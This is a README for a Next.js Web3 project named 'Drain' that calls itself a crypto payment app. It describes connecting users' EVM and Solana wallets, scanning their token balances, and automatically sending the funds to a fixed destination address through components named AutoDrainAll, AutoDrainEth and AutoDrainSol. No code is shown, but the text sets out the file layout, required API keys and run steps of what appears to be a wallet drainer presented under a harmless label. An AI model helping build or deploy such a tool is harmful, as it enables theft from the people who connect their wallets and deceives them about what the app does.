# Drain - Crypto Payment App

## Overview
A Web3 application that connects to EVM and Solana wallets and facilitates token transfers to a predefined destination address. Built with Next.js and TypeScript.

## Architecture
- **Framework**: Next.js 16 (Pages router) with TypeScript
- **Wallet Connection**: Reown AppKit (formerly WalletConnect's Web3Modal) for EVM chains; Phantom/Solflare for Solana
- **EVM Chains**: Ethereum, Polygon, BSC, Arbitrum, Optimism, Base
- **State Management**: Jotai atoms
- **Data Fetching**: TanStack React Query + Wagmi

## Key Files
- `pages/index.tsx` - Main page with wallet connect UI
- `pages/_app.tsx` - App wrapper with WagmiProvider and QueryClientProvider
- `pages/api/chain-info/[chainId]/[evmAddress].ts` - API route to fetch ERC-20 token balances via Moralis
- `src/appkit-config.ts` - AppKit (Reown) configuration with WagmiAdapter
- `components/AutoDrainAll.tsx` - Combined EVM + Solana drain component
- `components/AutoDrainEth.tsx` - EVM token scanning and transfer logic
- `components/AutoDrainSol.tsx` - Solana SOL transfer logic
- `src/atoms/destination-address-atom.ts` - Payment destination addresses
- `src/moralis-client.ts` - Moralis API client for fetching token balances

## Environment Variables
- `MORALIS_API_KEY` - Required for fetching ERC-20 token balances (server-side only)
- `NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID` - WalletConnect project ID for AppKit (optional, enables full features)

## Running
```
npm run dev
```
Server runs on port 5000.

## Notes
- The placeholder WalletConnect project ID will cause a 403 warning in logs but the app still functions for local development.
- To get full AppKit functionality, get a project ID from https://cloud.reown.com and set `NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID`.
- To enable token fetching, set `MORALIS_API_KEY` from https://admin.moralis.io/.
